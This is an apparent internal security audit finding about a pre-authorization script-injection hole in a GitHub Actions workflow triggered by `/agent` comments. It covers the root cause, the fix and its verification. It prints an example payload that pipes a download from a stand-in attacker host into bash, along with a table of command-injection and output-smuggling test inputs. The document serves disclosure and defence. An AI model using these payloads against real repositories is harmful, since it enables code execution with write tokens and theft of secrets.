---
id: 20260727-004-agent-task-comment-body-rce
status: closed
severity: blocker
principle: [IV, VI, VIII]
threat-model: n/a — supply-chain/CI surface; no THREAT-MODEL section covers CI (that gap is noted below)
location: .github/workflows/agent-task.yml:72 (job `gate`, step `parse`)
first-seen-run: 20260727-8bc5f6a
first-seen-date: 2026-07-27
fix-commit: pending (lands in the audit-remediation commit on 001-tor-route)
decision-ref: null
closed-date: 2026-07-27
closed-by: fix applied and verified in the same run — see "Verification of the fix"
---

# Pre-authorization RCE via the `/agent` comment body in `agent-task.yml`

## What the code did (at first-seen)

`.github/workflows/agent-task.yml:72`, first step of job `gate`:

```yaml
body="${{ toJSON(github.event.comment.body) }}"
```

Surrounding facts, all verified at `8bc5f6a`:

- Trigger `issue_comment: types: [created]` (`:31-32`) — fires for any comment on any
  issue or PR.
- Workflow-level `permissions: contents: write` + `pull-requests: write` (`:46-47`),
  inherited by every job.
- Step order in `gate` was **`parse` first, `auth` (collaborator check) second**. The
  authorization check therefore did not gate the comment body.
- The job `if:` guard required only `startsWith(github.event.comment.body, '/agent ')`.

## Why it leaks

GitHub Actions substitutes `${{ … }}` into the step script **as literal text before bash
parses it**. `toJSON()` wraps the value in double quotes and escapes `"` and `\` — but it
does not neutralise `$(…)`, backticks, or `${…}`, all of which bash evaluates *inside*
double quotes. The comment body is fully attacker-controlled.

A comment of:

```
/agent T001 $(curl -s https://attacker.example/x | bash)
```

satisfies the `startsWith` guard, and the command substitution executes on the runner in a
job holding a repo-write `GITHUB_TOKEN` — enabling push to the repo, PR creation, and
CI-minute burn. Because the collaborator check ran *after* this step, the execution was
**pre-authorization**.

This is the canonical GitHub Actions script-injection anti-pattern (untrusted event text
expanded into a `run:` block).

**Exposure at first-seen.** The repository was private
(`api.github.com/repos/zcat-app/stargate` → HTTP 404 unauthenticated), so it was not
anonymously exploitable. It was still a privilege-escalation path for any **read-only**
collaborator or org member able to comment — precisely the population the collaborator
check exists to exclude — and would have become full pre-auth RCE on the repository going
public, which Constitution Principle VI commits the project to.

A second instance of the same class sat at `:69`: `echo "ticket=${{ inputs.ticket }}"` on
the `workflow_dispatch` path, which additionally bypassed the shape-validation regex
(applied only on the `issue_comment` branch).

## Fix applied

1. **Authorization moved ahead of parsing.** `auth` is now the first step in `gate`;
   `parse` carries `if: steps.auth.outputs.authorized == 'true'`. Ordering is called out
   as load-bearing in the file header so it is not silently reversed.
2. **Untrusted text reaches shell only through `env:`.** `BODY`, `INPUT_TICKET`,
   `EVENT_NAME`, `REPO` and `COMMENT_USER` are passed as environment variables and read as
   `"$BODY"` etc. Env vars are not re-parsed as workflow expressions. No `${{ github.event.* }}`
   or `${{ inputs.* }}` remains inside any `run:` block in the file.
3. **Least privilege.** Workflow scope is now `permissions: {}` (default-deny). `gate` gets
   `contents: read`; `contents: write` + `pull-requests: write` are re-granted only on the
   `run` job, which executes after authorization and consumes only the validated ticket id.
4. **Both trigger paths validated.** The shape check now applies to the `workflow_dispatch`
   input too, using `[[ "$ticket" =~ ^T-?[0-9]+[a-z]?$ ]]` — `^…$` anchors at string bounds,
   so an embedded newline cannot smuggle an extra line into `$GITHUB_OUTPUT`.
5. **Body parsing takes the first line only** (`head -n 1`), so a multi-line body cannot
   emit one token per line into `$GITHUB_OUTPUT`.

Incidental correctness fix: the job `if:` previously called `substring(…)`, which is **not**
a GitHub Actions expression function (the set is `contains`/`startsWith`/`endsWith`/
`format`/`join`/`toJSON`/`fromJSON`/`hashFiles`). It is replaced with
`startsWith(github.event.comment.body, '/agent T')` plus an `author_association` pre-filter.
The pre-filter is explicitly documented as **not** an authorization decision — `COLLABORATOR`
includes read-only collaborators — it only stops drive-by comments from starting a job.

## Verification of the fix

The `parse` script was extracted verbatim and driven with attack payloads:

| Payload | Result |
|---|---|
| `/agent T001 $(echo PWNED > pwned.txt)` | `ticket=T001`, remainder discarded, **not executed** |
| ``/agent `touch pwned.txt` `` | rejected, rc=1 |
| `/agent T001;touch pwned.txt` | rejected, rc=1 |
| `/agent T001\nticket=EVIL\nauthorized=true` | single output line `ticket=T001` — no injection |
| dispatch input `$(echo PWNED > pwned.txt)` | rejected, rc=1 (was previously unvalidated) |

No `pwned.txt` was created in any case. Legitimate forms `T015`, `T-015`, `T094b` and a
valid dispatch input all still parse. YAML re-validated; step order asserted as
`['auth', 'parse']`; per-job permissions asserted.

## Residual risk

- The fix was verified against a faithful local reproduction of `toJSON()`/`${{ }}`
  substitution semantics, **not** against a live GitHub Actions runner.
- `M1`/`20260727-005`-class exposure remains: the `run` job still installs agent CLIs via
  unpinned `curl … | bash` and `npm install -g` while holding `ANTHROPIC_API_KEY`. Fixing
  the injection does not address that channel.
- The auto-approving agent in the `run` job can still execute arbitrary bash (see the
  opencode deny-rules finding). Authorization now gates it, but containment does not exist.
- `THREAT-MODEL.md` has no section covering the CI/agent-automation surface at all. Worth
  adding, since this workflow holds both a provider key and a repo-write token.

## Regression test

Add a CI lint (or extend `scripts/ground-check.sh`) asserting that no `run:` block in
`.github/workflows/**` contains `${{ github.event.` or `${{ inputs.`. That single grep
would have caught this at authoring time and prevents reintroduction — the same
"machine-check the invariant" discipline Principle VI applies to the green gate.

## Related

- Found during the 2026-07-27 milestone audit (`.scratch/audit.md`, finding B1).
- The unpinned installer and mutable-tag Action findings from the same run share the
  Principle IV root cause.
